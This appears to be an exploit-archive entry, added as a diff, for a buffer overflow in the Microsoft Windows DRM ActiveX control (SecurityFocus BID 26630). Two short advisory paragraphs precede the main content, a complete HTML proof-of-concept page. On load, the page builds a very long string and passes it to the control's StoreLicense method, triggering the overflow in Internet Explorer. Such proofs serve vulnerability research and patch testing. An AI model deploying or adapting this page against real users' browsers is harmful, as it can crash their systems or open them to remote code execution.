@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/26630/info
+
+Microsoft Windows Digital Rights Management (DRM) ActiveX control is prone to a buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.
+
+Successfully exploiting this issue allows remote attackers to execute arbitrary code in the context of the application using the ActiveX control (typically Internet Explorer). Failed exploit attempts likely result in denial-of-service conditions. 
+
+<html>
+<script>
+function test()
+{
+var obj;
+var x;
+
+x = "AAAA";
+
+for (i=0;i<=21;++i)
+x += x;
+
+obj = document.getElementById(&#039;testObj&#039;);
+obj.StoreLicense(x);
+}
+</script>
+<body onload="test();">
+<object id=&#039;testObj&#039;
+classid="CLSID:{760c4b83-e211-11d2-bf3e-00805fbe84a6}">
+</object>
+</body>
+</html>
